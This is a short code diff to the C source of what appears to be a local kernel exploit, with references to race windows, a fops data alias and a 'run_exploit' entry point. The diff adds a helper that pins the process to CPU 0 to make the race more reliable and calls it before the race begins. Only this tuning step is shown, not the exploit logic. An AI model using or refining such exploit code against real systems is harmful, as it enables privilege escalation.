@@ -1,5 +1,18 @@
 #include "common.h"
 
+/* Pin this process to CPU 0 for more stable races. */
+static void pin_self_to_cpu0(void) {
+  cpu_set_t mask;
+  CPU_ZERO(&mask);
+  CPU_SET(0, &mask);
+  if (sched_setaffinity(0, sizeof(mask), &mask) != 0) {
+    pr_warning("sched_setaffinity CPU0 failed errno=%d\n", errno);
+  } else {
+    pr_success("exploit pinned to CPU 0 pid=%d\n", getpid());
+  }
+}
+
+
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 uint32_t f_wait;
 uint32_t f_pi_target;
@@ -427,6 +440,9 @@ static int verify_fops_data_alias_before_production(void) {
 int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
+
+  /* Pin to CPU 0 before any race windows. */
+  pin_self_to_cpu0();
 
   disable_rseq_for_thread();
   set_limit();
